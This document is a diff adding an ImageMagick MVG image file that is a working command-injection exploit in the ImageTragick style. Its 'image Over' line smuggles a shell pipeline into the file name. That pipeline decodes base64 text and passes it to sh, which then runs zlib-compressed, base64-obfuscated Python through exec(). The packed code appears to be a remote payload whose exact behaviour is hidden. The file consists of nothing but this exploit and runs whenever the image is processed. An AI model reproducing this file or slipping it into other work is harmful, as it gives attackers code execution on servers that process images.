@@ -1,0 +1,8 @@
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|echo ZWNobyBleGVjXChfX2ltcG9ydF9fXChcJ3psaWJcJ1wpLmRlY29tcHJlc3NcKF9faW1wb3J0X19cKFwnYmFzZTY0XCdcKS5iNjRkZWNvZGVcKF9faW1wb3J0X19cKFwnY29kZWNzXCdcKS5nZXRlbmNvZGVyXChcJ3V0Zi04XCdcKVwoXCdlTm85VUUxTHhEQVFQVGUvSXJja0dFT3J0Y2hpQlJFUElpSzRleE9STmhrMU5FMUNrdFdxK045dHlPSXd6UEJtM256cTJidVFjSFJ5Z3NTL2pSNzVPRVRvV2g1VDJNdkVrNTRCdmJxQUY2d3REb045QTlyVWJJT3FGTDVXVzhXK0ZJdmk2QWsvNE8zRDlkM0xkdmQ0YzNYUE1rOUlaeTNJUkNscGFwSDF2Qk9uRGVIZEtpeFR4Z0REaENwWUpQaVVlK2ZoSWhvQVQ4OFlNbjNaU2V5dEgrUkV5ZVV0NFZFRWtCKzBaZXlwZmthcVAyREQwT2U3Tm9BTldLclloVm5icWFQLzdIRUpNd1FMU0pyUEZncWttMzJBR0duNWdCaTdOZ2NWWkNiL0laRnM0aTlEZjgralh2c1w9XCdcKVxbMFxdXClcKVwpIHwgZXhlYyAkKHdoaWNoIHB5dGhvbiB8fCB3aGljaCBweXRob24zIHx8IHdoaWNoIHB5dGhvbjIpIC0=|((command -v base64 >/dev/null && (base64 --decode || base64 -d)) || (command -v openssl >/dev/null && openssl enc -base64 -d))|sh'
+pop graphic-context
+pop graphic-context
